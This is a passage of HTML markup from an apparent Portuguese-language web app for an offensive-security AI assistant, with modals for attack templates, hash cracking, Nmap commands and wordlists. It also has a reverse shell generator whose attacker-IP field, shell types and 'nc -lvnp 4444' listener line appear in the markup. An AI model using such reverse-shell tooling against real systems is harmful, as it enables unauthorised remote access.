                                </button>
                                <button onclick="useTemplate('recon_ports')" class="template-btn">
                                    <i class="fas fa-network-wired text-cyan-400"></i>
                                    <span>Scan de Portas</span>
                                </button>
                            </div>
                        </div>
                        <!-- Exploração Web -->
                        <div class="template-category">
                            <h4 class="text-xs font-semibold text-[#EF4444] uppercase tracking-wider mb-2 flex items-center gap-2">
                                <i class="fas fa-bug"></i> Exploração Web
                            </h4>
                            <div class="grid gap-2">
                                <button onclick="useTemplate('sqli')" class="template-btn">
                                    <i class="fas fa-database text-red-400"></i>
                                    <span>SQL Injection</span>
                                </button>
                                <button onclick="useTemplate('xss')" class="template-btn">
                                    <i class="fas fa-code text-red-400"></i>
                                    <span>XSS Payloads</span>
                                </button>
                                <button onclick="useTemplate('lfi')" class="template-btn">
                                    <i class="fas fa-folder-open text-red-400"></i>
                                    <span>LFI/RFI</span>
                                </button>
                                <button onclick="useTemplate('ssrf')" class="template-btn">
                                    <i class="fas fa-server text-red-400"></i>
                                    <span>SSRF</span>
                                </button>
                            </div>
                        </div>
                        <!-- Pós-Exploração -->
                        <div class="template-category">
                            <h4 class="text-xs font-semibold text-[#F97316] uppercase tracking-wider mb-2 flex items-center gap-2">
                                <i class="fas fa-skull"></i> Pós-Exploração
                            </h4>
                            <div class="grid gap-2">
                                <button onclick="useTemplate('privesc_linux')" class="template-btn">
                                    <i class="fab fa-linux text-orange-400"></i>
                                    <span>PrivEsc Linux</span>
                                </button>
                                <button onclick="useTemplate('privesc_windows')" class="template-btn">
                                    <i class="fab fa-windows text-orange-400"></i>
                                    <span>PrivEsc Windows</span>
                                </button>
                                <button onclick="useTemplate('persistence')" class="template-btn">
                                    <i class="fas fa-door-open text-orange-400"></i>
                                    <span>Persistência</span>
                                </button>
                            </div>
                        </div>
                        <!-- Relatórios -->
                        <div class="template-category">
                            <h4 class="text-xs font-semibold text-[#A855F7] uppercase tracking-wider mb-2 flex items-center gap-2">
                                <i class="fas fa-file-alt"></i> Relatórios
                            </h4>
                            <div class="grid gap-2">
                                <button onclick="useTemplate('report_vuln')" class="template-btn">
                                    <i class="fas fa-exclamation-triangle text-purple-400"></i>
                                    <span>Documentar Vulnerabilidade</span>
                                </button>
                                <button onclick="useTemplate('report_exec')" class="template-btn">
                                    <i class="fas fa-file-contract text-purple-400"></i>
                                    <span>Resumo Executivo</span>
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="p-4 border-t border-[rgba(0,255,136,0.1)]">
                    <button onclick="closeTemplatesModal()" class="w-full bg-[#1E293B] hover:bg-[#334155] text-gray-300 rounded-xl py-3 font-medium transition-all border border-[#334155]">Fechar</button>
                </div>
            </div>
        </div>
        
        <!-- Upgrade Modal (Trial Expirado) -->
        <div id="upgradeModal" class="fixed inset-0 z-50 hidden items-center justify-center">
            <div class="absolute inset-0 bg-black/90 backdrop-blur-sm" onclick="closeUpgradeModal()"></div>
            <div class="relative z-10 w-full max-w-md mx-4 bg-[#0B0F14] rounded-2xl border border-[rgba(0,255,136,0.3)] shadow-2xl overflow-hidden">
                <div class="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-[#00FF88] via-[#00D4FF] to-[#8b5cf6]"></div>
                <div class="p-6 text-center">
                    <div class="w-20 h-20 mx-auto mb-4 rounded-full bg-gradient-to-br from-[#00FF88]/20 to-[#00D4FF]/20 flex items-center justify-center border border-[#00FF88]/30">
                        <i class="fas fa-crown text-4xl text-[#00FF88]"></i>
                    </div>
                    <h3 class="text-2xl font-bold text-white mb-2">Acesso Pro Necessário</h3>
                    <p class="text-gray-400 mb-6">Seu período de trial expirou. Faça upgrade para continuar usando as ferramentas Pro.</p>
                    <div class="space-y-3">
                        <a href="/profile#plans" class="block w-full bg-gradient-to-r from-[#00FF88] to-[#00D4FF] text-[#0a0a0f] font-bold py-3 rounded-xl hover:opacity-90 transition-all">
                            <i class="fas fa-rocket mr-2"></i>Ver Planos
                        </a>
                        <button onclick="closeUpgradeModal()" class="w-full bg-[#1E293B] hover:bg-[#334155] text-gray-300 rounded-xl py-3 font-medium transition-all border border-[#334155]">Fechar</button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Decoder/Encoder Modal -->
        <div id="decoderModal" class="fixed inset-0 z-50 hidden items-center justify-center">
            <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="closeDecoderModal()"></div>
            <div class="relative z-10 w-full max-w-lg mx-4 bg-[#0B0F14] rounded-2xl border border-[rgba(0,212,255,0.3)] shadow-2xl max-h-[85vh] flex flex-col">
                <div class="absolute top-0 left-1/4 right-1/4 h-px bg-gradient-to-r from-transparent via-[#00D4FF] to-transparent"></div>
                <div class="p-6 border-b border-[rgba(0,212,255,0.1)]">
                    <h3 class="text-xl font-bold text-white flex items-center gap-3">
                        <div class="w-10 h-10 rounded-xl bg-[rgba(0,212,255,0.1)] border border-[rgba(0,212,255,0.3)] flex items-center justify-center">
                            <i class="fas fa-code text-[#00D4FF]"></i>
                        </div>
                        Decoder / Encoder
                    </h3>
                </div>
                <div class="flex-1 overflow-y-auto p-6">
                    <div class="space-y-4">
                        <div>
                            <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Tipo</label>
                            <select id="decoderType" class="w-full bg-[#0B0F14] border border-[rgba(0,212,255,0.2)] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#00D4FF]">
                                <option value="base64">Base64</option>
                                <option value="url">URL Encode</option>
                                <option value="html">HTML Entities</option>
                                <option value="hex">Hexadecimal</option>
                                <option value="unicode">Unicode</option>
                            </select>
                        </div>
                        <div>
                            <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Input</label>
                            <textarea id="decoderInput" rows="4" placeholder="Cole o texto aqui..." class="w-full bg-[#0B0F14] border border-[rgba(0,212,255,0.2)] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#00D4FF] font-mono text-sm resize-none"></textarea>
                        </div>
                        <div class="flex gap-2">
                            <button onclick="decodeEncode('encode')" class="flex-1 bg-[#00D4FF]/20 hover:bg-[#00D4FF]/30 text-[#00D4FF] rounded-xl py-2 font-medium transition-all border border-[#00D4FF]/30">
                                <i class="fas fa-lock mr-2"></i>Encode
                            </button>
                            <button onclick="decodeEncode('decode')" class="flex-1 bg-[#00FF88]/20 hover:bg-[#00FF88]/30 text-[#00FF88] rounded-xl py-2 font-medium transition-all border border-[#00FF88]/30">
                                <i class="fas fa-unlock mr-2"></i>Decode
                            </button>
                        </div>
                        <div>
                            <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Output</label>
                            <div class="relative">
                                <textarea id="decoderOutput" rows="4" readonly class="w-full bg-[#0B0F14] border border-[rgba(0,212,255,0.2)] rounded-xl px-4 py-3 text-[#00FF88] focus:outline-none font-mono text-sm resize-none"></textarea>
                                <button onclick="copyDecoderOutput()" class="absolute top-2 right-2 text-gray-500 hover:text-[#00D4FF] transition-colors">
                                    <i class="fas fa-copy"></i>
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="p-4 border-t border-[rgba(0,212,255,0.1)]">
                    <button onclick="closeDecoderModal()" class="w-full bg-[#1E293B] hover:bg-[#334155] text-gray-300 rounded-xl py-3 font-medium transition-all border border-[#334155]">Fechar</button>
                </div>
            </div>
        </div>
        
        <!-- Hash Identifier Modal -->
        <div id="hashModal" class="fixed inset-0 z-50 hidden items-center justify-center">
            <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="closeHashModal()"></div>
            <div class="relative z-10 w-full max-w-lg mx-4 bg-[#0B0F14] rounded-2xl border border-[rgba(239,68,68,0.3)] shadow-2xl max-h-[85vh] flex flex-col">
                <div class="absolute top-0 left-1/4 right-1/4 h-px bg-gradient-to-r from-transparent via-[#EF4444] to-transparent"></div>
                <div class="p-6 border-b border-[rgba(239,68,68,0.1)]">
                    <h3 class="text-xl font-bold text-white flex items-center gap-3">
                        <div class="w-10 h-10 rounded-xl bg-[rgba(239,68,68,0.1)] border border-[rgba(239,68,68,0.3)] flex items-center justify-center">
                            <i class="fas fa-key text-[#EF4444]"></i>
                        </div>
                        Hash Identifier
                    </h3>
                </div>
                <div class="flex-1 overflow-y-auto p-6">
                    <div class="space-y-4">
                        <div>
                            <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Hash</label>
                            <input type="text" id="hashInput" placeholder="Cole o hash aqui..." class="w-full bg-[#0B0F14] border border-[rgba(239,68,68,0.2)] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#EF4444] font-mono">
                        </div>
                        <button onclick="identifyHash()" class="w-full bg-gradient-to-r from-[#EF4444] to-[#DC2626] hover:opacity-90 text-white rounded-xl py-3 font-bold transition-all">
                            <i class="fas fa-search mr-2"></i>Identificar Hash
                        </button>
                        <div id="hashOutput" class="bg-[#0B0F14] border border-[rgba(239,68,68,0.2)] rounded-xl p-4 min-h-[80px]">
                            <span class="text-gray-500 text-sm">Resultado aparecerá aqui...</span>
                        </div>
                        <div class="border-t border-[rgba(239,68,68,0.1)] pt-4">
                            <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Gerar Comando Hashcat</label>
                            <select id="hashTypeSelect" class="w-full bg-[#0B0F14] border border-[rgba(239,68,68,0.2)] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#EF4444] mb-2">
                                <option value="0">MD5 (0)</option>
                                <option value="100">SHA-1 (100)</option>
                                <option value="1400">SHA-256 (1400)</option>
                                <option value="1700">SHA-512 (1700)</option>
                                <option value="1000">NTLM (1000)</option>
                                <option value="3200">bcrypt (3200)</option>
                                <option value="1800">SHA-512 Crypt (1800)</option>
                            </select>
                            <button onclick="generateHashcatCmd()" class="w-full bg-[#EF4444]/20 hover:bg-[#EF4444]/30 text-[#EF4444] rounded-xl py-2 font-medium transition-all border border-[#EF4444]/30">
                                <i class="fas fa-terminal mr-2"></i>Gerar Comando
                            </button>
                        </div>
                    </div>
                </div>
                <div class="p-4 border-t border-[rgba(239,68,68,0.1)]">
                    <button onclick="closeHashModal()" class="w-full bg-[#1E293B] hover:bg-[#334155] text-gray-300 rounded-xl py-3 font-medium transition-all border border-[#334155]">Fechar</button>
                </div>
            </div>
        </div>
        
        <!-- Reverse Shell Generator Modal -->
        <div id="revshellModal" class="fixed inset-0 z-50 hidden items-center justify-center">
            <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="closeRevshellModal()"></div>
            <div class="relative z-10 w-full max-w-lg mx-4 bg-[#0B0F14] rounded-2xl border border-[rgba(0,255,136,0.3)] shadow-2xl max-h-[85vh] flex flex-col">
                <div class="absolute top-0 left-1/4 right-1/4 h-px bg-gradient-to-r from-transparent via-[#00FF88] to-transparent"></div>
                <div class="p-6 border-b border-[rgba(0,255,136,0.1)]">
                    <h3 class="text-xl font-bold text-white flex items-center gap-3">
                        <div class="w-10 h-10 rounded-xl bg-[rgba(0,255,136,0.1)] border border-[rgba(0,255,136,0.3)] flex items-center justify-center">
                            <i class="fas fa-terminal text-[#00FF88]"></i>
                        </div>
                        Reverse Shell Generator
                    </h3>
                </div>
                <div class="flex-1 overflow-y-auto p-6">
                    <div class="space-y-4">
                        <div class="grid grid-cols-2 gap-4">
                            <div>
                                <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">IP do Atacante</label>
                                <input type="text" id="revshellIP" placeholder="10.10.14.1" class="w-full bg-[#0B0F14] border border-[rgba(0,255,136,0.2)] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#00FF88] font-mono">
                            </div>
                            <div>
                                <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Porta</label>
                                <input type="text" id="revshellPort" placeholder="4444" value="4444" class="w-full bg-[#0B0F14] border border-[rgba(0,255,136,0.2)] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#00FF88] font-mono">
                            </div>
                        </div>
                        <div>
                            <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Tipo de Shell</label>
                            <select id="revshellType" class="w-full bg-[#0B0F14] border border-[rgba(0,255,136,0.2)] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#00FF88]">
                                <option value="bash">Bash TCP</option>
                                <option value="bash_udp">Bash UDP</option>
                                <option value="nc">Netcat -e</option>
                                <option value="nc_mkfifo">Netcat mkfifo</option>
                                <option value="python">Python</option>
                                <option value="python3">Python3</option>
                                <option value="php">PHP</option>
                                <option value="perl">Perl</option>
                                <option value="ruby">Ruby</option>
                                <option value="powershell">PowerShell</option>
                            </select>
                        </div>
                        <button onclick="generateRevshell()" class="w-full bg-gradient-to-r from-[#00FF88] to-[#00D4FF] hover:opacity-90 text-[#0a0a0f] rounded-xl py-3 font-bold transition-all">
                            </i>Gerar Reverse Shell
                        </button>
                        <div class="hidden" id="revshellOutputContainer">
                            <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Comando Gerado</label>
                            <div class="relative">
                                <pre id="revshellOutput" class="bg-[#0B0F14] border border-[rgba(0,255,136,0.2)] rounded-xl p-4 text-[#00FF88] font-mono text-sm overflow-x-auto whitespace-pre-wrap break-all"></pre>
                                <button onclick="copyRevshell()" class="absolute top-2 right-2 text-gray-500 hover:text-[#00FF88] transition-colors">
                                    <i class="fas fa-copy"></i>
                                </button>
                            </div>
                            <p class="text-gray-500 text-xs mt-2"><i class="fas fa-info-circle mr-1"></i>Listener: <code class="text-[#00D4FF]">nc -lvnp 4444</code></p>
                        </div>
                    </div>
                </div>
                <div class="p-4 border-t border-[rgba(0,255,136,0.1)]">
                    <button onclick="closeRevshellModal()" class="w-full bg-[#1E293B] hover:bg-[#334155] text-gray-300 rounded-xl py-3 font-medium transition-all border border-[#334155]">Fechar</button>
                </div>
            </div>
        </div>
        
        <!-- Checklist Modal -->
        <div id="checklistModal" class="fixed inset-0 z-50 hidden items-center justify-center">
            <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="closeChecklistModal()"></div>
            <div class="relative z-10 w-full max-w-2xl mx-4 bg-[#0B0F14] rounded-2xl border border-[rgba(249,115,22,0.3)] shadow-2xl max-h-[85vh] flex flex-col">
                <div class="absolute top-0 left-1/4 right-1/4 h-px bg-gradient-to-r from-transparent via-[#F97316] to-transparent"></div>
                <div class="p-6 border-b border-[rgba(249,115,22,0.1)]">
                    <h3 class="text-xl font-bold text-white flex items-center gap-3">
                        <div class="w-10 h-10 rounded-xl bg-[rgba(249,115,22,0.1)] border border-[rgba(249,115,22,0.3)] flex items-center justify-center">
                            <i class="fas fa-list-check text-[#F97316]"></i>
                        </div>
                        Checklist OWASP Top 10
                    </h3>
                    <div class="mt-3 flex items-center gap-3">
                        <div class="flex-1 h-2 bg-[#1E293B] rounded-full overflow-hidden">
                            <div id="checklistProgress" class="h-full bg-gradient-to-r from-[#F97316] to-[#EF4444] transition-all" style="width: 0%"></div>
                        </div>
                        <span id="checklistPercent" class="text-sm font-bold text-[#F97316]">0%</span>
                    </div>
                </div>
                <div class="flex-1 overflow-y-auto p-4">
                    <div class="space-y-2" id="checklistItems">
                        <!-- Items serão inseridos via JS -->
                    </div>
                </div>
                <div class="p-4 border-t border-[rgba(249,115,22,0.1)] flex gap-3">
                    <button onclick="resetChecklist()" class="flex-1 bg-[#1E293B] hover:bg-[#334155] text-gray-300 rounded-xl py-3 font-medium transition-all border border-[#334155]">
                        <i class="fas fa-rotate-left mr-2"></i>Resetar
                    </button>
                    <button onclick="closeChecklistModal()" class="flex-1 bg-gradient-to-r from-[#F97316] to-[#EA580C] hover:opacity-90 text-white rounded-xl py-3 font-bold transition-all">Fechar</button>
                </div>
            </div>
        </div>
        
        <!-- Export Modal -->
        <div id="exportModal" class="fixed inset-0 z-50 hidden items-center justify-center">
            <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="closeExportModal()"></div>
            <div class="relative z-10 w-full max-w-md mx-4 bg-[#0B0F14] rounded-2xl p-6 border border-[rgba(168,85,247,0.3)] shadow-2xl">
                <div class="absolute top-0 left-1/4 right-1/4 h-px bg-gradient-to-r from-transparent via-[#A855F7] to-transparent"></div>
                <h3 class="text-xl font-bold text-white mb-4 flex items-center gap-3">
                    <div class="w-10 h-10 rounded-xl bg-[rgba(168,85,247,0.1)] border border-[rgba(168,85,247,0.3)] flex items-center justify-center">
                        <i class="fas fa-download text-[#A855F7]"></i>
                    </div>
                    Exportar Chat
                </h3>
                <p class="text-gray-400 text-sm mb-6">Escolha o formato para exportar a conversa atual.</p>
                <div class="grid grid-cols-2 gap-3 mb-6">
                    <button onclick="downloadChat('md')" class="flex flex-col items-center gap-2 p-4 rounded-xl bg-[rgba(168,85,247,0.05)] border border-[rgba(168,85,247,0.2)] hover:border-[rgba(168,85,247,0.5)] hover:bg-[rgba(168,85,247,0.1)] transition-all group">
                        <i class="fab fa-markdown text-2xl text-[#A855F7] group-hover:scale-110 transition-transform"></i>
                        <span class="text-sm text-gray-300">Markdown</span>
                    </button>
                    <button onclick="downloadChat('txt')" class="flex flex-col items-center gap-2 p-4 rounded-xl bg-[rgba(168,85,247,0.05)] border border-[rgba(168,85,247,0.2)] hover:border-[rgba(168,85,247,0.5)] hover:bg-[rgba(168,85,247,0.1)] transition-all group">
                        <i class="fas fa-file-lines text-2xl text-[#A855F7] group-hover:scale-110 transition-transform"></i>
                        <span class="text-sm text-gray-300">Texto</span>
                    </button>
                </div>
                <button onclick="closeExportModal()" class="w-full bg-[#1E293B] hover:bg-[#334155] text-gray-300 rounded-xl py-3 font-medium transition-all border border-[#334155]">Cancelar</button>
            </div>
        </div>
        
        <!-- Nmap Generator Modal -->
        <div id="nmapModal" class="fixed inset-0 z-50 hidden items-center justify-center">
            <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="closeNmapModal()"></div>
            <div class="relative z-10 w-full max-w-lg mx-4 bg-[#0B0F14] rounded-2xl border border-[rgba(0,212,255,0.3)] shadow-2xl max-h-[85vh] flex flex-col">
                <div class="absolute top-0 left-1/4 right-1/4 h-px bg-gradient-to-r from-transparent via-[#00D4FF] to-transparent"></div>
                <div class="p-6 border-b border-[rgba(0,212,255,0.1)]">
                    <h3 class="text-xl font-bold text-white flex items-center gap-3">
                        <div class="w-10 h-10 rounded-xl bg-[rgba(0,212,255,0.1)] border border-[rgba(0,212,255,0.3)] flex items-center justify-center">
                            <i class="fas fa-network-wired text-[#00D4FF]"></i>
                        </div>
                        Gerador de Comandos Nmap
                    </h3>
                    <p class="text-gray-400 text-sm mt-2">Gere comandos nmap otimizados para seu scan</p>
                </div>
                <div class="flex-1 overflow-y-auto p-6">
                    <div class="space-y-4">
                        <div>
                            <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Alvo (IP ou domínio)</label>
                            <input type="text" id="nmapTarget" placeholder="192.168.1.1 ou exemplo.com" class="w-full bg-[#0B0F14] border border-[rgba(0,212,255,0.2)] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#00D4FF] font-mono">
                        </div>
                        <div>
                            <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Tipo de Scan</label>
                            <select id="nmapScanType" class="w-full bg-[#0B0F14] border border-[rgba(0,212,255,0.2)] rounded-xl px-4 py-3 text-white focus:outline-none focus:border-[#00D4FF]">
                                <option value="quick">Scan Rápido (-F)</option>
                                <option value="full">Scan Completo (-p-)</option>
                                <option value="top100">Top 100 Portas</option>
                                <option value="top1000">Top 1000 Portas</option>
                                <option value="udp">Scan UDP (-sU)</option>
                                <option value="stealth">Scan Stealth (-sS)</option>
                                <option value="version">Detecção de Versão (-sV)</option>
                                <option value="aggressive">Agressivo (-A)</option>
                                <option value="vuln">Scan de Vulnerabilidades</option>
                            </select>
                        </div>
                        <div>
                            <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Opções Adicionais</label>
                            <div class="grid grid-cols-2 gap-2">
                                <label class="flex items-center gap-2 p-2 rounded-lg bg-[rgba(0,212,255,0.05)] border border-[rgba(0,212,255,0.1)] cursor-pointer hover:border-[rgba(0,212,255,0.3)]">
                                    <input type="checkbox" id="nmapOS" class="accent-[#00D4FF]">
                                    <span class="text-sm text-gray-300">Detectar OS (-O)</span>
                                </label>
                                <label class="flex items-center gap-2 p-2 rounded-lg bg-[rgba(0,212,255,0.05)] border border-[rgba(0,212,255,0.1)] cursor-pointer hover:border-[rgba(0,212,255,0.3)]">
                                    <input type="checkbox" id="nmapScripts" class="accent-[#00D4FF]">
                                    <span class="text-sm text-gray-300">Scripts (-sC)</span>
                                </label>
                                <label class="flex items-center gap-2 p-2 rounded-lg bg-[rgba(0,212,255,0.05)] border border-[rgba(0,212,255,0.1)] cursor-pointer hover:border-[rgba(0,212,255,0.3)]">
                                    <input type="checkbox" id="nmapVerbose" class="accent-[#00D4FF]">
                                    <span class="text-sm text-gray-300">Verbose (-v)</span>
                                </label>
                                <label class="flex items-center gap-2 p-2 rounded-lg bg-[rgba(0,212,255,0.05)] border border-[rgba(0,212,255,0.1)] cursor-pointer hover:border-[rgba(0,212,255,0.3)]">
                                    <input type="checkbox" id="nmapNoPin" class="accent-[#00D4FF]">
                                    <span class="text-sm text-gray-300">Skip Ping (-Pn)</span>
                                </label>
                            </div>
                        </div>
                        <div id="nmapOutput" class="hidden">
                            <label class="block text-xs font-semibold text-gray-500 uppercase tracking-wider mb-2">Comando Gerado</label>
                            <div class="bg-[#0B0F14] border border-[rgba(0,212,255,0.2)] rounded-xl p-4 font-mono text-sm text-[#00D4FF] relative">
                                <code id="nmapCommand"></code>
                                <button onclick="copyNmapCommand()" class="absolute top-2 right-2 text-gray-500 hover:text-[#00D4FF] transition-colors">
                                    <i class="fas fa-copy"></i>
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="p-4 border-t border-[rgba(0,212,255,0.1)] flex gap-3">
                    <button onclick="closeNmapModal()" class="flex-1 bg-[#1E293B] hover:bg-[#334155] text-gray-300 rounded-xl py-3 font-medium transition-all border border-[#334155]">Cancelar</button>
                    <button onclick="generateNmapCommand()" class="flex-1 bg-gradient-to-r from-[#00D4FF] to-[#0EA5E9] hover:opacity-90 text-white rounded-xl py-3 font-bold transition-all">
                        <i class="fas fa-terminal mr-2"></i>Gerar
                    </button>
                </div>
            </div>
        </div>
        
        <!-- Wordlist Modal -->
        <div id="wordlistModal" class="fixed inset-0 z-50 hidden items-center justify-center">
            <div class="absolute inset-0 bg-black/80 backdrop-blur-sm" onclick="closeWordlistModal()"></div>
            <div class="relative z-10 w-full max-w-2xl mx-4 bg-[#0B0F14] rounded-2xl border border-[rgba(236,72,153,0.3)] shadow-2xl max-h-[85vh] flex flex-col">
                <div class="absolute top-0 left-1/4 right-1/4 h-px bg-gradient-to-r from-transparent via-[#EC4899] to-transparent"></div>
                <div class="p-6 border-b border-[rgba(236,72,153,0.1)]">
                    <h3 class="text-xl font-bold text-white flex items-center gap-3">
                        <div class="w-10 h-10 rounded-xl bg-[rgba(236,72,153,0.1)] border border-[rgba(236,72,153,0.3)] flex items-center justify-center">
                            <i class="fas fa-list text-[#EC4899]"></i>
                        </div>
                        Wordlists para Pentest
                    </h3>
                    <p class="text-gray-400 text-sm mt-2">Wordlists populares e onde encontrá-las</p>
                </div>
                <div class="flex-1 overflow-y-auto p-4">
                    <div class="space-y-3">
                        <div class="p-4 rounded-xl bg-[rgba(236,72,153,0.05)] border border-[rgba(236,72,153,0.1)]">
                            <h4 class="font-semibold text-white flex items-center gap-2 mb-2">
                                <i class="fas fa-folder text-[#EC4899]"></i> SecLists
                            </h4>
                            <p class="text-gray-400 text-sm mb-2">Coleção mais completa de wordlists para pentest</p>
                            <code class="text-xs text-[#EC4899] bg-black/30 px-2 py-1 rounded">git clone https://github.com/danielmiessler/SecLists.git</code>
                        </div>
                        <div class="p-4 rounded-xl bg-[rgba(236,72,153,0.05)] border border-[rgba(236,72,153,0.1)]">
                            <h4 class="font-semibold text-white flex items-center gap-2 mb-2">
                                <i class="fas fa-key text-[#EC4899]"></i> RockYou
                            </h4>
                            <p class="text-gray-400 text-sm mb-2">14 milhões de senhas vazadas - essencial para brute force</p>
                            <code class="text-xs text-[#EC4899] bg-black/30 px-2 py-1 rounded">/usr/share/wordlists/rockyou.txt</code>
                        </div>
                        <div class="p-4 rounded-xl bg-[rgba(236,72,153,0.05)] border border-[rgba(236,72,153,0.1)]">
                            <h4 class="font-semibold text-white flex items-center gap-2 mb-2">
                                <i class="fas fa-globe text-[#EC4899]"></i> Dirbuster
                            </h4>
                            <p class="text-gray-400 text-sm mb-2">Wordlists para descoberta de diretórios web</p>
                            <code class="text-xs text-[#EC4899] bg-black/30 px-2 py-1 rounded">/usr/share/wordlists/dirbuster/</code>
                        </div>
                        <div class="p-4 rounded-xl bg-[rgba(236,72,153,0.05)] border border-[rgba(236,72,153,0.1)]">
                            <h4 class="font-semibold text-white flex items-center gap-2 mb-2">
                                <i class="fas fa-at text-[#EC4899]"></i> Subdomains
                            </h4>
                            <p class="text-gray-400 text-sm mb-2">Para enumeração de subdomínios</p>
                            <code class="text-xs text-[#EC4899] bg-black/30 px-2 py-1 rounded">SecLists/Discovery/DNS/subdomains-top1million-*.txt</code>
                        </div>
                        <div class="p-4 rounded-xl bg-[rgba(236,72,153,0.05)] border border-[rgba(236,72,153,0.1)]">
                            <h4 class="font-semibold text-white flex items-center gap-2 mb-2">
                                <i class="fas fa-user text-[#EC4899]"></i> Usernames
                            </h4>
                            <p class="text-gray-400 text-sm mb-2">Nomes de usuário comuns</p>
                            <code class="text-xs text-[#EC4899] bg-black/30 px-2 py-1 rounded">SecLists/Usernames/</code>
                        </div>
                    </div>
                </div>
                <div class="p-4 border-t border-[rgba(236,72,153,0.1)]">
                    <button onclick="closeWordlistModal()" class="w-full bg-[#1E293B] hover:bg-[#334155] text-gray-300 rounded-xl py-3 font-medium transition-all border border-[#334155]">Fechar</button>
                </div>
            </div>
        </div>
        
        <!-- Main Content -->
        <main class="flex-1 flex flex-col min-h-0">
            <!-- Beta Warning Banner - Cyber Style -->
            <div id="betaBanner" class="border-b border-[rgba(249,115,22,0.3)] px-4 py-2 lg:py-3 flex-shrink-0" style="background: linear-gradient(90deg, rgba(249,115,22,0.1), rgba(239,68,68,0.1), rgba(249,115,22,0.1));">
                <div class="flex items-center justify-center gap-2 lg:gap-3 text-center flex-wrap">
                    <div class="flex items-center gap-2">
                        <i class="fas fa-flask text-amber-400 animate-pulse text-sm"></i>
                        <span class="text-amber-300 font-semibold text-xs lg:text-sm" style="font-family: var(--font-mono); letter-spacing: 2px;">[BETA]</span>
                    </div>
                    <span class="text-amber-200/80 text-xs lg:text-sm" style="font-family: var(--font-mono);">
                        // Sistema em desenvolvimento. Algumas funcionalidades podem estar instáveis.
                    </span>
                    <button onclick="closeBetaBanner()" class="text-amber-400 hover:text-amber-200 transition-colors ml-1" title="Fechar aviso">
                        <i class="fas fa-times text-sm"></i>
                    </button>
                </div>
            </div>
            
            <!-- Session Header - Cyber Terminal Style -->
            <div id="sessionHeader" class="hidden px-6 py-4 backdrop-blur-xl border-b border-[rgba(0,255,136,0.2)] flex items-center justify-between" style="background: linear-gradient(90deg, rgba(10,10,15,0.95), rgba(13,17,23,0.9));">
                <div class="flex items-center gap-4">
                    <div class="w-10 h-10 flex items-center justify-center border border-[rgba(0,255,136,0.4)]" style="background: linear-gradient(135deg, rgba(0,255,136,0.15), rgba(0,212,255,0.1)); clip-path: polygon(0 4px, 4px 4px, 4px 0, calc(100% - 4px) 0, calc(100% - 4px) 4px, 100% 4px, 100% calc(100% - 4px), calc(100% - 4px) calc(100% - 4px), calc(100% - 4px) 100%, 4px 100%, 4px calc(100% - 4px), 0 calc(100% - 4px));">
                        <i class="fas fa-crosshairs text-[#00FF88] animate-pulse"></i>
                    </div>
                    <div>
                        <p class="text-[10px] text-[#00FF88] uppercase tracking-[3px]" style="font-family: var(--font-mono);">// TARGET</p>
                        <p id="sessionTargetDomain" class="text-sm font-bold text-white" style="font-family: var(--font-mono); text-shadow: 0 0 10px rgba(0,255,136,0.3);">-</p>
                    </div>
                </div>
                <div class="flex items-center gap-2 text-xs" style="font-family: var(--font-mono);">
                    <i class="fas fa-robot text-[#bf00ff]"></i>
                    <span class="text-[#bf00ff]">DEEPEYES_AI</span>
                </div>
            </div>
            
            <!-- Chat Messages -->
            <div id="chatContainer" class="flex-1 overflow-y-auto p-6">
                <!-- Welcome para Pagina Inicial (sem sessao) -->
                <div id="homeWelcome" class="flex flex-col items-center py-4 px-4 w-full max-w-4xl mx-auto">
                    <!-- Header com saudação -->
                    <div class="w-full mb-6 text-center">
                        <h2 class="text-2xl font-bold text-white mb-2">Olá, <span id="dashUserName" class="text-gradient-neon">Operador</span></h2>
                        <p class="text-gray-400 text-sm">Sua IA de <span class="text-[#00FF88] font-semibold">Segurança Ofensiva</span> para Pentest, Red Team e CTFs.</p>
                    </div>
                    
                    <!-- Stats Grid -->
                    <div class="grid grid-cols-2 lg:grid-cols-4 gap-4 w-full mb-6">
                        <!-- Sessões -->
                        <div class="bg-[#1a1a24] border border-[#2a2a3a] rounded-xl p-4 hover:border-[#00D4FF]/30 transition-all">
                            <div class="flex items-center gap-3 mb-3">
                                <div class="w-10 h-10 rounded-lg bg-[#00D4FF]/10 flex items-center justify-center">
                                    <i class="fas fa-comments text-[#00D4FF]"></i>
                                </div>
                                <span class="text-gray-400 text-xs uppercase tracking-wider">Sessões</span>
                            </div>
                            <div class="text-3xl font-bold text-white" id="dashStatSessions">0</div>
                        </div>
                        
                        <!-- Mensagens -->
                        <div class="bg-[#1a1a24] border border-[#2a2a3a] rounded-xl p-4 hover:border-[#8b5cf6]/30 transition-all">
                            <div class="flex items-center gap-3 mb-3">
